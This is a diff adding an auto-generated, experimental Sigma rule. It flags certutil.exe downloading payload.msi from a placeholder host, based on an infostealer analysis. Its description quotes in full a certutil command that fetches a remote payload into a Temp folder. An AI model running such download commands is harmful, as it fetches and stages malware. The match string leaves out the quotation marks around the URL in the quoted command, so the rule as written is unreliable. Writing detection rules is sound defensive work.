@@ -1,0 +1,23 @@
+title: 'Command the source shows being run: certutil -f https://example.com/payload.msi'
+id: 15594d1b-87c3-4d87-b527-0493fee9e569
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "certutil -urlcache -split -f "https://example.com/payload.msi"
+  "C:\Users\user\AppData\Local\Temp\000013370.msi"".'
+references:
+- https://www.gendigital.com/blog/insights/research/warden-stealer-rust-infostealer-analysis
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-15'
+tags: []
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: \certutil.exe
+    CommandLine|contains: -f https://example.com/payload.msi
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hunt_id: H-0779
